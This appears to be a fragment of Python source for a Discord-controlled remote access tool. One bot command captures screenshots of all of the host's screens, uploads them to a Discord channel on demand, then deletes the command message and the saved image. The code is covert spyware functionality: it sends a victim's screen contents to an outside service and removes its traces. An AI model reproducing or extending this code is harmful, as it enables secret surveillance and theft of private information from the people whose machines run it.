import subprocess
from PIL import ImageGrab

@client.command(name="ss")
async def screenshot(ctx):
    if ctx.message.channel.id in channel_ids.values():
        ImageGrab.grab(all_screens=True).save('ss.png')
        await ctx.reply(embed=discord.Embed(title=current_time() + '`[On demand]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'ss.png'), mention_author=False)
        await ctx.message.delete()
        subprocess.run(f'del /s ss.png', shell=True)
    else:
        return